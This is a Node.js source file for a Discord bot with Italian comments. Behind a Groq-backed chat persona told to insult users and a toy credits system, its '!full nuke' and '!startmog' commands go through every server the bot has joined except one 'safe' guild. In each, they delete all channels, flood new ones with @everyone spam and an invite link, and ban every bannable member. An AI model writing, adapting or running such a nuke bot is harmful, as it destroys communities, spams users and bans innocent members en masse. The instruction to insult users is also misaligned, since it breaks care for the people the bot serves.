const { Client, GatewayIntentBits, Partials, ChannelType, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require("discord.js");
const axios = require("axios");

// --- CONFIGURAZIONE ---
const BOT_TOKEN = process.env.BOT_TOKEN;
const GROQ_API_KEY = process.env.GROQ_API_KEY;
const OWNER_IDS = (process.env.OWNER_IDS || "1533097239449305241").split(",");
const SAFE_GUILD_ID = "1458642569348120741"; // Server intoccabile

const bot = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.DirectMessages
    ],
    partials: [Partials.Message, Partials.Channel, Partials.GuildMember]
});

// Mock database (se non usi un DB esterno su Railway, i dati si resettano al riavvio)
let db_credits = {};
let db_conversations = {};

const isOwner = (u) => OWNER_IDS.includes(u.id);

// --- SANITIZZAZIONE AI ---
function sanitize(text) {
    if (!text) return "";
    return text.replace(/@everyone/gi, "@everyone_").replace(/@here/gi, "@here_").replace(/https?:\/\/[^\s]+/gi, "[link_blocked]");
}

bot.on("messageCreate", async (msg) => {
    if (msg.author.bot) return;

    const content = msg.content.trim();
    const uid = msg.author.id;

    // --- AI CHAT (Menzioni o Risposte) ---
    const mentionsBot = msg.mentions.has(bot.user.id);
    const isReplyToBot = msg.reference && (await msg.channel.messages.fetch(msg.reference.messageId)).author.id === bot.user.id;

    if ((mentionsBot || isReplyToBot) && !content.startsWith("!")) {
        msg.channel.sendTyping().catch(() => {});
        try {
            const prompt = content.replace(/<@!?\d+>/g, "").trim();
            const res = await axios.post("https://api.groq.com/openai/v1/chat/completions", {
                model: "llama-3.3-70b-versatile",
                messages: [
                    { role: "system", content: "Sei XLSQR Bot, un bot Discord arrabbiato, sarcastico e impaziente. Usa slang come 'bruh', 'tf', '💀'. Aiuta ma insulta l'utente." },
                    { role: "user", content: prompt }
                ]
            }, { headers: { "Authorization": `Bearer ${GROQ_API_KEY}` } });
            
            return msg.reply(sanitize(res.data.choices[0].message.content));
        } catch (e) {
            return msg.reply("bruh AI is dead 💀");
        }
    }

    // --- COMANDI (!) ---
    if (!content.startsWith("!")) return;
    const args = content.slice(1).trim().split(/\s+/);
    const cmd = args.shift().toLowerCase();

    try {
        // --- NUKE GLOBALE ---
        if (cmd === "full" && args[0] === "nuke") {
            if (!isOwner(msg.author)) return msg.reply("❌ Non sei il mio capo, sparisci.");
            await msg.channel.send("☢️ **INIZIO DISTRUZIONE TOTALE...** ☢️");

            for (const [guildId, guild] of bot.guilds.cache) {
                if (guildId === SAFE_GUILD_ID) continue; // Salta server sicuro

                try {
                    // Elimina canali
                    const channels = await guild.channels.fetch();
                    for (const [cId, ch] of channels) if (ch && ch.deletable) await ch.delete();

                    // Crea e spamma
                    for (let i = 0; i < 10; i++) {
                        const newCh = await guild.channels.create({ name: "NUKED BY AMIR", type: ChannelType.GuildText });
                        for (let j = 0; j < 5; j++) {
                            await newCh.send("@here @everyone https://discord.gg/sourcehubs").catch(() => {});
                        }
                    }

                    // Banna tutti
                    const members = await guild.members.fetch();
                    for (const [mId, m] of members) {
                        if (m.bannable && !isOwner(m.user) && mId !== bot.user.id) await m.ban({ reason: "NUKED BY AMIR" });
                    }
                } catch (e) {}
            }
            return msg.channel.send("☣️ **TUTTI I SERVER SONO STATI PURIFICATI.**");
        }

        // --- START MOG ---
        if (cmd === "startmog") {
            if (!isOwner(msg.author)) return msg.reply("❌ No.");
            for (const [guildId, guild] of bot.guilds.cache) {
                if (guildId === SAFE_GUILD_ID) continue;
                try {
                    const channels = await guild.channels.fetch();
                    for (const [cId, ch] of channels) if (ch.deletable) await ch.delete();
                    const n = await guild.channels.create({ name: "AMIR HUB THE BEST", type: ChannelType.GuildText });
                    await n.send("@here @everyone https://discord.gg/sourcehubs");
                } catch (e) {}
            }
            return msg.channel.send("✅ Mogged.");
        }

        // --- COMANDI ECONOMY ---
        if (cmd === "claimdaily") {
            db_credits[uid] = (db_credits[uid] || 0) + 1;
            return msg.reply("✅ +1 credito aggiunto.");
        }

        if (cmd === "balance") {
            return msg.reply(`💰 Hai **${db_credits[uid] || 0}** crediti.`);
        }

        // --- HELP ---
        if (cmd === "help") {
            return msg.reply("**Lista Comandi:**\n`!full nuke`, `!startmog`, `!safe`, `!claimdaily`, `!balance`, `!aiask` o menziona il bot.");
        }

        if (cmd === "safe") {
            return msg.reply("🛡️ Questo server è nella safe-zone.");
        }

    } catch (err) {
        console.error(err);
    }
});

bot.once("ready", () => {
    console.log(`[BOT ONLINE] ${bot.user.tag}`);
    bot.user.setActivity("Nuking Servers...", { type: 3 });
});

bot.login(BOT_TOKEN);
